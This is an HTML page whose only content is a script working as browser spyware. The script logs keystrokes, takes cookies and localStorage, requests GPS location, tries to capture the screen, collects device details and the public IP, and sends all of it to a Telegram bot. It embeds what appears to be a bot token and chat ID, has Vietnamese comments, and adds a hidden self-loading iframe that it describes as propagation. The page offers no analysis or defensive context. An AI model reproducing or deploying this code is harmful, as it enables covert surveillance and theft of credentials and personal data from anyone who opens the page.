<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>K</title>
</head>
<body>
<script>
const params = new URLSearchParams(window.location.search);
const TOKEN = params.get('8857347575:AAHLToPXKo9m8UXMZxMeglQaSf11ox02k5c') || prompt('Token:');
const CHAT = params.get('8973014468') || prompt('Chat ID:');
const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

function send(t) {
  fetch(API, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({chat_id:CHAT, text:t.substring(0,4096)})
  }).catch(()=>{});
}

// 1. Keylog
let buf = [];
document.addEventListener('keydown', e => {
  let k = e.key;
  if (k === 'Unidentified') return;
  const map = {'Backspace':'[BS]','Enter':'[ENTER]\n','Tab':'[TAB]','Shift':'[SHIFT]','Control':'[CTRL]','Alt':'[ALT]','Escape':'[ESC]','Delete':'[DEL]','CapsLock':'[CAPS]','ArrowUp':'[↑]','ArrowDown':'[↓]','ArrowLeft':'[←]','ArrowRight':'[→]'};
  k = map[k] || k;
  buf.push(k);
  if (buf.length >= 30) { send(`⌨️ ${window.location.href}\n${new Date().toLocaleString()}\n${buf.join('')}`); buf = []; }
});
setInterval(() => { if(buf.length) { send(`⌨️ ${window.location.href}\n${new Date().toLocaleString()}\n${buf.join('')}`); buf = []; } }, 4000);

// 2. Cookie + LocalStorage
try { send(`🍪 Cookie: ${document.cookie || 'không có'}\n💾 LocalStorage: ${JSON.stringify(localStorage) || 'không có'}`); } catch(e) {}

// 3. GPS
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    p => send(`📍 Vị trí: https://maps.google.com?q=${p.coords.latitude},${p.coords.longitude}`),
    () => {}
  );
}

// 4. Chụp ảnh màn hình (WebRTC)
function captureScreen() {
  navigator.mediaDevices.getDisplayMedia({ video: true })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const img = canvas.toDataURL('image/png');
        fetch(API, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: CHAT, photo: img })
        }).catch(()=>{});
        stream.getTracks().forEach(t => t.stop());
      };
    }).catch(()=>{});
}
setTimeout(captureScreen, 2000);

// 5. Lan truyền qua iframe (tự động nhúng vào các trang khác nếu có thể)
try {
  const f = document.createElement('iframe');
  f.src = window.location.href;
  f.style.display = 'none';
  document.body.appendChild(f);
} catch(e) {}

// 6. Thông tin thiết bị
send(`🖥️ ${navigator.userAgent}\n📱 Màn hình: ${screen.width}x${screen.height}\n🕒 ${new Date().toLocaleString()}`);

// 7. IP
fetch('https://api.ipify.org?format=json')
  .then(r => r.json())
  .then(d => send(`🌐 IP: ${d.ip}`))
  .catch(()=>{});
</script>
</body>
</html>
